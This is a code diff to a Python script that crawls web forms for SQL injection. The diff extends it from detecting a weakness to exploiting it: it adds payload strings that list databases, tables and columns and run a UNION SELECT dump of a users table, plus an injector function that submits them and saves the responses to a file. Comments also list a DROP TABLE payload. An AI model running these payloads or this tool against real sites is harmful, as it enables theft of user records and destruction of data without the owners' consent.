@@ -8,9 +8,14 @@ from bs4 import BeautifulSoup as bs
 # admin', 'whatever', 'hackmail') --
 # ') UNION SELECT * FROM users --
 # '); DROP TABLE users; --
-# '); SHOW TABLE; --
+# '); SHOW TABLES; --
 # '); SHOW COLUMNS FROM users; --
 # '); SHOW DATABASES; --
+
+show_databases = "'); SHOW DATABASES; -- "
+show_table = "'); SHOW TABLES; -- "
+show_columns = "'); SHOW COLUMNS FROM users; -- "
+dump_all = "') UNION SELECT * FROM users -- "
 
 
 if len(sys.argv) < 2:
@@ -41,6 +46,7 @@ def get_form_details(form):
         input_value = input_tag.attrs.get("value", "")
         inputs.append({"type": input_type, "id": input_id, "value": input_value})
     forms = {"script": form.attrs.get("action").lower(), "inputs": inputs}
+    forms["submit"] = type_action
     return forms
 
 
@@ -72,7 +78,7 @@ def scan_sql_injection(url):
                     except:
                         pass
                     break
-            data["get"] = "Get"
+            data[type_action] = ""
             url = urljoin(url, form_details["script"])
             if type_action == "post":
                 res = s.post(url, data=data)
@@ -80,9 +86,31 @@ def scan_sql_injection(url):
                 res = s.get(url, params=data)
             if is_vulnerable(res):
                 print(f"Injection vulnerability detected for: {url}. Form: \n{form_details}")
+                with open("show_databases.txt", "w") as f:
+                    injector(url, form_details, show_databases, f)
+                    injector(url, form_details, show_table, f)
+                    injector(url, form_details, show_columns, f)
+                    injector(url, form_details, dump_all, f)
                 break
             else:
                 print("[!] SQL Injection no vulnerability detected:")
+
+
+def injector(url, form_details, injection, file):
+    data = {}
+    for input_tag in form_details["inputs"]:
+        if input_tag["type"] == "text" or input_tag["type"] == "email":
+            try:
+                data[input_tag["id"]] = injection
+            except:
+                pass
+            break
+    data[type_action] = ""
+    res = s.get(url, params=data)
+    res = res.content.decode().replace("<br>", "\n")
+    res = res.replace("<br />", "\n")
+    file.write(res)
+    print(res)
 
 
 scan_sql_injection(url)
